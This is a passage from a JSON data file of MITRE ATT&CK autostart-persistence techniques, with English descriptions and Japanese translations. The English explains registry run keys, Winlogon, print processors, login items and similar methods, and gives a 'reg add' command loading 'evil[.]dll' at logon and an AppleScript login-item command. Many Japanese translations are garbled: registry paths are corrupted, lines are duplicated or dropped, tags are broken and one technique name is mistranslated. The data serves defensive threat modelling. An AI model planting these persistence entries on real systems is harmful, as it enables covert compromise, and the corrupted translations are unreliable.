                        "description_jp": "攻撃者は、システム起動時に自動的にプログラムを実行するようにカーネルを変更する可能性があります。ローダブルカーネルモジュール（LKM）は、要求に応じてカーネルにロードしたりアンロードしたりできるコードの断片です。システムを再起動することなく、カーネルの機能を拡張します。例えば、モジュールの一種にデバイス・ドライバがあり、カーネルがシステムに接続されたハードウェアにアクセスできるようにする。 引用：Linuxカーネル・プログラミング\n\n悪意を持って使用された場合、LKMはカーネルモード[ルートキット](https://attack.mitre.org/techniques/T1014)の一種となり、オペレーティングシステムの最高権限(Ring 0)で実行されます(引用: Linux Kernel Module Programming Guide)。LKMベースのルートキットの一般的な機能には、自身を隠すこと、ファイル、プロセス、ネットワーク活動の選択的な非表示、およびログの改ざん、認証済みのバックドアの提供、非特権ユーザーへのルートアクセスの有効化などがあります(引用: iDefense Rootkit Overview)。\n\nkextとも呼ばれるカーネル拡張機能は、LinuxのLKMと同様にシステムに機能をロードするためにmacOSで使用されます。カーネルはセキュリティを実施する責任があり、カーネル拡張機能はカーネルの一部として実行されるため、kextはmacOSのセキュリティポリシーに支配されません。Kextsは<code>kextload</code>と<code>kextunload</code>コマンドでロードとアンロードを行います。Kext は、Apple からカーネル拡張に署名できる権限を与えられた開発者 ID で署名する必要があります。これらの権限を持たない開発者でもkextに署名することはできますが、SIPが無効になっていない限りロードされません。SIPが有効になっている場合、kextの署名はAuxKCに追加される前に検証されます。(引用: macOSにおけるシステムとカーネル拡張)\n\nmacOS Catalina 10.15以降、カーネル拡張機能は廃止され、システム拡張機能が使用されるようになりました。しかし、カーネルプログラミングインタフェースのシステム拡張がないため、kextは「レガシーシステム拡張」として許可されています。\n\n攻撃者は LKM と kext を使って、システム上で [Persistence](https://attack.mitre.org/tactics/TA0003) や [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) を行うことができます。例としては、Volatility Phalanx2)(引用: CrowdStrike Linux Rootkit)(引用: GitHub Reptile)(引用: GitHub Diamorphine)(引用: RSAC 2015 San Francisco Patrick Wardle)(引用: Synack Secure Kernel Extension Broken)(引用: Securelist Ventir)(引用: Trend Micro Skidmap)"
                    },
                    {
                        "id": "T1547.007",
                        "name_eng": "Re-opened Applications",
                        "name_jp": "再募集",
                        "description_eng": "Adversaries may modify plist files to automatically run an application when a user logs in. When a user logs out or restarts via the macOS Graphical User Interface (GUI), a prompt is provided to the user with a checkbox to \"Reopen windows when logging back in\".(Citation: Re-Open windows on Mac) When selected, all applications currently open are added to a property list file named <code>com.apple.loginwindow.[UUID].plist</code> within the <code>~/Library/Preferences/ByHost</code> directory.(Citation: Methods of Mac Malware Persistence)(Citation: Wardle Persistence Chapter) Applications listed in this file are automatically reopened upon the user’s next logon.\n\nAdversaries can establish [Persistence](https://attack.mitre.org/tactics/TA0003) by adding a malicious application path to the <code>com.apple.loginwindow.[UUID].plist</code> file to execute payloads when a user logs in.",
                        "description_jp": "攻撃者は、ユーザーがログインしたときに自動的にアプリケーションを実行するようにplistファイルを変更する可能性がある。ユーザーがmacOSのグラフィカル・ユーザー・インターフェース（GUI）を使ってログアウトまたは再起動すると、「再ログイン時にウィンドウを開き直す」というチェックボックスが付いたプロンプトが表示される（引用：Re-Open windows on Mac）。apple.loginwindow.[UUID].plist<//code>という名前のプロパティ リスト ファイルに追加されます。(引用: Mac マルウェア永続化の方法)(引用: Wardle 永続化の章) このファイルにリストされているアプリケーションは、ユーザーの次のログオン時に自動的に再開されます。\n\n攻撃者は、<code>com.apple.loginwindow.[UUID].plist</code>ファイルに悪意のあるアプリケーションのパスを追加することで、[Persistence](https://attack.mitre.org/tactics/TA0003)を確立し、ユーザーがログインしたときにペイロードを実行することができます。"
                    },
                    {
                        "id": "T1547.004",
                        "name_eng": "Winlogon Helper DLL",
                        "name_jp": "ウィンログオンヘルパーDLL",
                        "description_eng": "Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\\Software[\\\\Wow6432Node\\\\]\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> and <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> are used to manage additional helper programs and functionalities that support Winlogon.(Citation: Cylance Reg Persistence Sept 2013) \n\nMalicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: (Citation: Cylance Reg Persistence Sept 2013)\n\n* Winlogon\\Notify - points to notification package DLLs that handle Winlogon events\n* Winlogon\\Userinit - points to userinit.exe, the user initialization program executed when a user logs on\n* Winlogon\\Shell - points to explorer.exe, the system shell executed when a user logs on\n\nAdversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.",
                        "description_jp": "攻撃者はWinlogonの機能を悪用し、ユーザーがログインした際にDLLや実行ファイルを実行する可能性がある。Winlogon.exe は、ログオン/ログオフ時のアクションや、Ctrl-Alt-Delete によってトリガーされるセキュア アテンション シーケンス (SAS) を担当する Windows コンポーネントです。<code>HKLMSoftware[◆Wow6432Node]◆MicrosoftWindows NTCurrentVersion</code>と<code>HKCUSoftware</code>のレジストリエントリは、Winlogonをサポートする追加のヘルパープログラムと機能を管理するために使用される(Citation: Cylance Reg Persistence Sept 2013)\n\nこれらのレジストリキーに悪意のある変更を加えると、Winlogonが悪意のあるDLLや実行可能ファイルをロードして実行する可能性があります。具体的には、以下のサブキーが悪用される可能性があることが知られています: (引用: Cylance Reg Persistence Sept 2013)\n\n* WinlogonNotify - Winlogonイベントを処理する通知パッケージDLLを指す。\n* WinlogonUserinit - userinit.exe（ユーザーがログオンしたときに実行されるユーザー初期化プログラム）を指す。\n* WinlogonShell - explorer.exe（ユーザがログオンしたときに実行されるシス テムシェル）を指す。\n\nWinlogonShell-ユーザがログオンしたときに実行されるシステム・シェルであるexplorer.exeを指す。"
                    },
                    {
                        "id": "T1547.005",
                        "name_eng": "Security Support Provider",
                        "name_jp": "セキュリティ・サポート・プロバイダー",
                        "description_eng": "Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.\n\nThe SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)",
                        "description_jp": "攻撃者は、セキュリティサポートプロバイダ（SSP）を悪用して、システム起動時に DLL を実行する可能性がある。WindowsのSSP DLLは、システム起動時にローカルセキュリティオーソリティ（LSA）プロセスにロードされる。LSA にロードされると、SSP DLL は、ログオンしているユーザーのドメイン・パスワードやスマート・カードの PIN など、Windows に保存されている暗号化されたパスワードや平文のパスワードにアクセスできるようになる。\n\nSSP 構成は、2つのレジストリ・キーに格納される：<Code>HKLMSYSTEM\\CurrentControlSetControlLsaSecurity Packages</code> と <Code>HKLMSYSTEM\\CurrentControlSetControlLsaOSConfig\\Security Packages</code> である。敵対者は、これらのレジストリ・キーを変更して新しいSSPを追加し、次回システム起動時、またはAddSecurityPackage Windows API関数が呼び出されたときにロードする可能性がある(Citation: Graeber 2014)。"
                    },
                    {
                        "id": "T1547.001",
                        "name_eng": "Registry Run Keys / Startup Folder",
                        "name_jp": "レジストリの実行キー / スタートアップフォルダ",
                        "description_eng": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.(Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nThe following run keys are created by default on Windows systems:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nRun keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation: Malwarebytes Wow6432Node 2016) The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.(Citation: Microsoft Run Key) For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)\n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users\\\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>.\n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run automatically for the currently logged-on user.\n\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.",
                        "description_jp": "攻撃者は、プログラムをスタートアップフォルダに追加したり、レジストリのランキーで参照したりすることで、永続性を実現することができる。レジストリまたはスタートアップフォルダの「実行キー」にエントリを追加すると、ユーザーがログインしたときに参照されたプログラムが実行されるようになる（引用：Microsoft Run Key）。\n\nWindowsシステムでは、以下のランキーがデフォルトで作成される：\n\n* <code>HKEY_CURRENT_USERSoftwareMicrosoftWindows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\SoftwareMicrosoftWindows\\CurrentVersionRunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\MicrosoftWindows\\CurrentVersion</code>Run</code>\n* <code>HKEY_LOCAL_MACHINE_Software\\MicrosoftWindows\\CurrentVersion\\RunOnce</code>\n\nランキーは複数のハイブの下に存在する可能性があります。(引用: Microsoft Wow6432Node 2018)(引用: Malwarebytes Wow6432Node 2016) <code>HKEY_LOCAL_MACHINE\\SoftwareMicrosoftWindows\\CurrentVersionRunOnceEx</code> も利用可能ですが、Windows Vista以降ではデフォルトでは作成されません。レジストリのランキーエントリは、プログラムを直接参照することも、依存関係としてリストすることもできます。 引用：Microsoft Run Key） 例えば、RunOnceExで「Depend」キーを使用してログオン時にDLLをロードすることが可能です：<code>reg add HKLMSOFTWARE\\MicrosoftWindowsCurrentVersionRunOnceEx0001Depend /v 1 /d \"C:゙temp\\evil[.]dll\"</code> （引用：Oddvar Moe RunOnceEx 2018年3月号\n\nスタートアップフォルダ内にプログラムを配置すると、ユーザーがログインしたときにそのプログラムが実行されるようにもなる。個々のユーザーアカウント用のスタートアップフォルダーの場所と、どのユーザーアカウントがログインしてもチェックされるシステム全体のスタートアップフォルダーがあります。現在のユーザーのスタートアップフォルダのパスは<code>C:¥Users¥Windows¥AppData¥Roaming¥Microsoft¥Windows¥Start Menu¥ProgramsStartup</code>である。全ユーザのスタートアップフォルダのパスは<code>C:¥ProgramData¥Microsoft¥Windows¥Start Menu¥Programs¥StartUp</code>です。\n\n以下のレジストリ・キーを使用して、永続化するスタートアップ・フォルダ項目を設定できます：\n\n<code>HKEY_CURRENT_USER\\SoftwareMicrosoftWindows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\SoftwareMicrosoftWindows\\CurrentVersionExplorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWAREMicrosoftWindows\\CurrentVersion ReplicaShell Folders</code>\n* <code>HKEY_LOCAL_MACHINE ProxySOFTWARE</code> * <code>HKEY_LOCAL_MACHINE ProxySOFTWARE</code> * <code>HKEY_LOCAL_MACHINE ProxySOFTWARE</code\n\n以下のレジストリキーは、ブート時のサービスの自動起動を制御できます：\n\n<code>HKEY_LOCAL_MACHINE\\SoftwareMicrosoftWindows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USERソフトウェアの章\n* <code>HKEY_LOCAL_MACHINE\\SoftwareMicrosoftWindows\\CurrentVersionRunServices</code>\n* <code>HKEY_CURRENT_USER\\SoftwareMicrosoftWindows\\CurrentVersion\\RunServices</code>\n\nポリシー設定を使用してスタートアップ プログラムを指定すると、2 つのレジストリ キーのいずれかに対応する値が作成されます：\n\n<code>HKEY_LOCAL_MACHINE\\SoftwareMicrosoftWindowsCurrentVersion\\Policies\\Explorer\\Run</code>\n<code>HKEY_CURRENT_USER Software\\MicrosoftWindows\\CurrentVersion\\Policies\\Explorer</Run</code>\n\nレジストリキー<code>HKEY_CURRENT_USER</code>のロード値にリストされているプログラムは、現在ログオンしているユーザーに対して自動的に実行されます。\n\nデフォルトでは、レジストリ・キー<code>HKEY_LOCAL_MACHINE</code>の</code>BootExecute</code>値は<code>autocheck autochk *</code>に設定されています。この値は、システムが異常にシャットダウンされた場合、起動時にWindowsがハード ディスクのファイル システムの整合性をチェックするようにします。攻撃者は、起動時に自動的に起動する他のプログラムやプロセスを、このレジストリ値に追加することができる。\n\n攻撃者は、リモートアクセスツールなどのマルウェアを実行するために、これらの設定ロケーションを使用し、システムの再起動を通じて永続性を維持することができます。また、攻撃者は[Masquerading](https://attack.mitre.org/techniques/T1036)を使用して、レジストリエントリが正規のプログラムに関連付けられているかのように見せかけることもできます。"
                    },
                    {
                        "id": "T1547.008",
                        "name_eng": "LSASS Driver",
                        "name_jp": "LSASSドライバー",
                        "description_eng": "Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process.(Citation: Microsoft Security Subsystem)\n\nAdversaries may target LSASS drivers to obtain persistence. By either replacing or adding illegitimate drivers (e.g., [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574)), an adversary can use LSA operations to continuously execute malicious payloads.",
                        "description_jp": "攻撃者はLSASSドライバを変更または追加して、侵害されたシステム上で永続性を得ることができる。Windowsセキュリティサブシステムは、コンピュータやドメインのセキュリティポリシーを管理・実施するコンポーネントの集合である。ローカルセキュリティオーソリティ（LSA）は、ローカルセキュリティポリシーとユーザー認証を担当する主要コンポーネントである。LSAには、他のさまざまなセキュリティ機能に関連する複数のダイナミックリンクライブラリ（DLL）が含まれており、これらはすべてLSAサブシステムサービス（LSASS）lsass.exeプロセスのコンテキストで実行される（引用：Microsoft Security Subsystem）。\n\n攻撃者は、LSASSドライバを標的として永続性を獲得する可能性があります。不正なドライバ(例えば、[Hijack Execution Flow](https://attack.mitre.org/techniques/T1574))を置き換えたり追加したりすることで、敵対者はLSAオペレーションを使用して悪意のあるペイロードを継続的に実行することができます。"
                    },
                    {
                        "id": "T1547.012",
                        "name_eng": "Print Processors",
                        "name_jp": "プリントプロセッサー",
                        "description_eng": "Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, `spoolsv.exe`, during boot.(Citation: Microsoft Intro Print Processors)\n\nAdversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the <code>AddPrintProcessor</code> API call with an account that has <code>SeLoadDriverPrivilege</code> enabled. Alternatively, a print processor can be registered to the print spooler service by adding the <code>HKLM\\SYSTEM\\\\[CurrentControlSet or ControlSet001]\\Control\\Print\\Environments\\\\[Windows architecture: e.g., Windows x64]\\Print Processors\\\\[user defined]\\Driver</code> Registry key that points to the DLL.\n\nFor the malicious print processor to be correctly installed, the payload must be located in the dedicated system print-processor directory, that can be found with the <code>GetPrintProcessorDirectory</code> API call, or referenced via a relative path from this directory.(Citation: Microsoft AddPrintProcessor May 2018) After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.(Citation: ESET PipeMon May 2020)\n\nThe print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.",
                        "description_jp": "攻撃者はプリントプロセッサを悪用して、システムブート中に悪意のある DLL を実行し、永続化や権限昇格を行う可能性がある。プリントプロセッサは、ブート中にプリントスプーラサービスである `spoolsv.exe` によってロードされる DLL である。(引用: Microsoft Intro Print Processors)\n\n攻撃者は、起動時に悪意のあるDLLをロードするプリントプロセッサを追加することで、プリントスプーラサービスを悪用する可能性があります。プリント プロセッサは、<code>SeLoadDriverPrivilege</code> を有効にしたアカウントで、<code>AddPrintProcessor</code> API 呼び出しによってインストールできます。または、DLLを指すレジストリキー<code>HKLMSYSTEM</code>[CurrentControlSet or ControlSet001]◆ControlPrint</code>[Windowsアーキテクチャ: 例: Windows x64]◆Print Processors</code>[ユーザー定義]◆Driver</code>を追加することで、プリントプロセッサをプリントスプーラサービスに登録できます。\n\n悪意のあるプリント プロセッサが正しくインストールされるには、ペイロードが専用のシステム プリント プロセッサ ディレクトリに配置されている必要があり、このディレクトリは <code>GetPrintProcessorDirectory</code> API 呼び出しで見つけることができるか、このディレクトリからの相対パスを介して参照されます (引用: Microsoft AddPrintProcessor 2018年5月)。プリント プロセッサがインストールされた後、それらを実行するには、ブート中に起動するプリント スプーラ サービスを再起動する必要があります (引用: ESET PipeMon 2020年5月)。\n\nプリントスプーラサービスはSYSTEMレベルの権限で実行されるため、敵がインストールしたプリントプロセッサは昇格した権限で実行される可能性があります。"
                    },
                    {
                        "id": "T1547.014",
                        "name_eng": "Active Setup",
                        "name_jp": "アクティブセットアップ",
                        "description_eng": "Adversaries may achieve persistence by adding a Registry key to the Active Setup of the local machine. Active Setup is a Windows mechanism that is used to execute programs when a user logs in. The value stored in the Registry key will be executed after a user logs into the computer.(Citation: Klein Active Setup 2010) These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nAdversaries may abuse Active Setup by creating a key under <code> HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\</code> and setting a malicious value for <code>StubPath</code>. This value will serve as the program that will be executed when a user logs into the computer.(Citation: Mandiant Glyer APT 2010)(Citation: Citizenlab Packrat 2015)(Citation: FireEye CFR Watering Hole 2012)(Citation: SECURELIST Bright Star 2015)(Citation: paloalto Tropic Trooper 2016)\n\nAdversaries can abuse these components to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.",
                        "description_jp": "攻撃者は、ローカル・マシンのアクティブ・セットアップにレジストリ・キーを追加することで、永続性を実現することができる。アクティブ・セットアップは、ユーザーがログインしたときにプログラムを実行するために使用されるWindowsのメカニズムである。レジストリ・キーに格納された値は、ユーザがコンピュータにログインした後に実行される(引用: Klein Active Setup 2010)。これらのプログラムは、ユーザのコンテキスト下で実行され、アカウントに関連付けられた権限レベルを持つ。\n\n攻撃者は、<code> HKLMSOFTWAREMicrosoftActive Setup\\Installed Components</code>の下にキーを作成し、<code>StubPath</code>に悪意のある値を設定することで、Active Setupを悪用する可能性があります。この値は、ユーザーがコンピュータにログインしたときに実行されるプログラムとして機能します。 引用：Mandiant Glyer APT 2010）（ 引用：Citizenlab Packrat 2015）（ 引用：FireEye CFR Watering Hole 2012）（ 引用：SECURELIST Bright Star 2015）（ 引用：paloalto Tropic Trooper 2016\n\n攻撃者はこれらのコンポーネントを悪用して、リモートアクセスツールなどのマルウェアを実行し、システムの再起動を通じて永続性を維持することができます。また、攻撃者は[Masquerading](https://attack.mitre.org/techniques/T1036)を使用して、レジストリエントリが正規のプログラムに関連付けられているかのように見せかけることもあります。"
                    },
                    {
                        "id": "T1547.015",
                        "name_eng": "Login Items",
                        "name_jp": "ログイン項目",
                        "description_eng": "Adversaries may add login items to execute upon user login to gain persistence or escalate privileges. Login items are applications, documents, folders, or server connections that are automatically launched when a user logs in.(Citation: Open Login Items Apple) Login items can be added via a shared file list or Service Management Framework.(Citation: Adding Login Items) Shared file list login items can be set using scripting languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002), whereas the Service Management Framework uses the API call <code>SMLoginItemSetEnabled</code>.\n\nLogin items installed using the Service Management Framework leverage <code>launchd</code>, are not visible in the System Preferences, and can only be removed by the application that created them.(Citation: Adding Login Items)(Citation: SMLoginItemSetEnabled Schroeder 2013) Login items created using a shared file list are visible in System Preferences, can hide the application when it launches, and are executed through LaunchServices, not launchd, to open applications, documents, or URLs without using Finder.(Citation: Launch Services Apple Developer) Users and applications use login items to configure their user environment to launch commonly used services or applications, such as email, chat, and music applications.\n\nAdversaries can utilize [AppleScript](https://attack.mitre.org/techniques/T1059/002) and [Native API](https://attack.mitre.org/techniques/T1106) calls to create a login item to spawn malicious executables.(Citation: ELC Running at startup) Prior to version 10.5 on macOS, adversaries can add login items by using [AppleScript](https://attack.mitre.org/techniques/T1059/002) to send an Apple events to the “System Events” process, which has an AppleScript dictionary for manipulating login items.(Citation: Login Items AE) Adversaries can use a command such as <code>tell application “System Events” to make login item at end with properties /path/to/executable</code>.(Citation: Startup Items Eclectic)(Citation: hexed osx.dok analysis 2019)(Citation: Add List Remove Login Items Apple Script) This command adds the path of the malicious executable to the login item file list located in <code>~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm</code>.(Citation: Startup Items Eclectic) Adversaries can also use login items to launch executables that can be used to control the victim system remotely or as a means to gain privilege escalation by prompting for user credentials.(Citation: objsee mac malware 2017)(Citation: CheckPoint Dok)(Citation: objsee netwire backdoor 2019)",
                        "description_jp": "攻撃者は、ユーザーのログイン時に実行するログイン項目を追加して、永続性を得たり特権を昇格させたりする可能性がある。ログイン項目とは、ユーザーがログインしたときに自動的に起動されるアプリケーション、ドキュメント、フォルダ、またはサーバー接続のことです。(引用: Open Login Items Apple) ログイン項目は、共有ファイルリストまたはサービス管理フレームワークを介して追加することができます。(引用: Adding Login Items) 共有ファイルリストのログイン項目は、次のようなスクリプト言語を使って設定できます。 [AppleScript](https://attack.mitre.org/techniques/T1059/002), 一方、Service Management FrameworkはAPIコール<code>SMLoginItemSetEnabled</code>を使用します。\n\nサービス管理フレームワークのレバレッジ<code>launchd</code>を使用してインストールされたログイン項目は、システム環境設定には表示されず、それらを作成したアプリケーションによってのみ削除することができます。(引用: Adding Login Items)(引用: SMLoginItemSetEnabled Schroeder 2013) 共有ファイルリストを使用して作成されたログイン項目は、システム環境設定で表示され、起動時にアプリケーションを隠すことができ、launchdではなくLaunchServicesを介して実行され、Finderを使用せずにアプリケーション、ドキュメント、またはURLを開くことができます。(引用: Launch Services Apple Developer) ユーザーやアプリケーションは、ログイン項目を使用してユーザー環境を設定し、電子メール、チャット、音楽アプリケーションなど、よく使用されるサービスやアプリケーションを起動します。\n\n攻撃者は、[AppleScript](https://attack.mitre.org/techniques/T1059/002)および[Native API](https://attack.mitre.org/techniques/T1106)コールを利用してログイン項目を作成し、悪意のある実行可能ファイルを生成することができます。(引用: ELC Running at startup) macOSのバージョン10.5以前では、敵対者は[AppleScript](https://attack.mitre.org/techniques/T1059/002)を使用して、ログイン項目を操作するためのAppleScript辞書を持つ「システムイベント」プロセスにAppleイベントを送信することで、ログイン項目を追加することができる。(引用: Login Items AE) 攻撃者は、 <code>tell application “System Events” to make login item at end with properties /path/to/executable</code> のようなコマンドを使うことができます。(引用: Startup Items Eclectic)(引用: hexed osx.dok analysis 2019)(引用: Add List Remove Login Items Apple Script) このコマンドは、 <code>~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm</code> にあるログイン項目ファイルリストに悪意のある実行ファイルのパスを追加します。(引用: Startup Items Eclectic) 攻撃者はまた、ログイン・アイテムを使用して、被害者システムをリモートで制御するために使用できる実行可能ファイルを起動したり、ユーザー認証情報の入力を促して特権を昇格させる手段として使用したりすることもできる。(引用: objsee mac malware 2017)(引用: CheckPoint Dok)(引用: objsee netwire backdoor 2019)"
                    },
                    {
                        "id": "T1547.013",
                        "name_eng": "XDG Autostart Entries",
                        "name_jp": "XDGオートスタートエントリー",
                        "description_eng": "Adversaries may add or modify XDG Autostart Entries to execute malicious programs or commands when a user’s desktop environment is loaded at login. XDG Autostart entries are available for any XDG-compliant Linux system. XDG Autostart entries use Desktop Entry files (`.desktop`) to configure the user’s desktop environment upon user login. These configuration files determine what applications launch upon user login, define associated applications to open specific file types, and define applications used to open removable media.(Citation: Free Desktop Application Autostart Feb 2006)(Citation: Free Desktop Entry Keys)\n\nAdversaries may abuse this feature to establish persistence by adding a path to a malicious binary or command to the `Exec` directive in the `.desktop` configuration file. When the user’s desktop environment is loaded at user login, the `.desktop` files located in the XDG Autostart directories are automatically executed. System-wide Autostart entries are located in the `/etc/xdg/autostart` directory while the user entries are located in the `~/.config/autostart` directory.\n\nAdversaries may combine this technique with [Masquerading](https://attack.mitre.org/techniques/T1036) to blend malicious Autostart entries with legitimate programs.(Citation: Red Canary Netwire Linux 2022)",
                        "description_jp": "侵入者は、XDG 自動起動エントリを追加または変更することで、ログイン時にユーザーのデスクトップ環境がロードされる際に、悪意のあるプログラムやコマンドを実行する可能性があります。XDG 自動起動エントリは、XDG 準拠の Linux システムで使用できます。XDG 自動起動エントリは、デスクトップ エントリ ファイル (`.desktop`) を使用して、ユーザーのログイン時にデスクトップ環境を設定します。これらの設定ファイルは、ユーザーログイン時に起動するアプリケーションを決定し、特定のファイルタイプを開くための関連アプリケーションを定義し、リムーバブルメディアを開くために使用するアプリケーションを定義します(引用: Free Desktop Application Autostart Feb 2006)(Citation: Free Desktop Entry Keys)\n\n攻撃者はこの機能を悪用し、`.desktop`設定ファイルの`Exec`ディレクティブに悪意のあるバイナリやコマンドへのパスを追加することで、永続性を確立する可能性がある。ユーザーのログイン時にデスクトップ環境がロードされると、XDG の自動起動ディレクトリにある `.desktop` ファイルが自動的に実行されます。システム全体の Autostart エントリは `/etc/xdg/autostart` ディレクトリにあり、ユーザーのエントリは `~/.config/autostart` ディレクトリにあります。\n\n攻撃者は、このテクニックを[Masquerading](https://attack.mitre.org/techniques/T1036)と組み合わせて、悪意のあるAutostartエントリーを正当なプログラムに紛れ込ませる可能性がある(引用: Red Canary Netwire Linux 2022)。"
                    },
                    {
                        "id": "T1547.003",
                        "name_eng": "Time Providers",
                        "name_jp": "時間プロバイダー",
                        "description_eng": "Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains.(Citation: Microsoft W32Time Feb 2018) W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.(Citation: Microsoft TimeProvider)\n\nTime providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of `HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\`.(Citation: Microsoft TimeProvider) The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed.(Citation: Microsoft TimeProvider)\n\nAdversaries may abuse this architecture to establish persistence, specifically by creating a new arbitrarily named subkey  pointing to a malicious DLL in the `DllName` value. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account.(Citation: Github W32Time Oct 2017)",
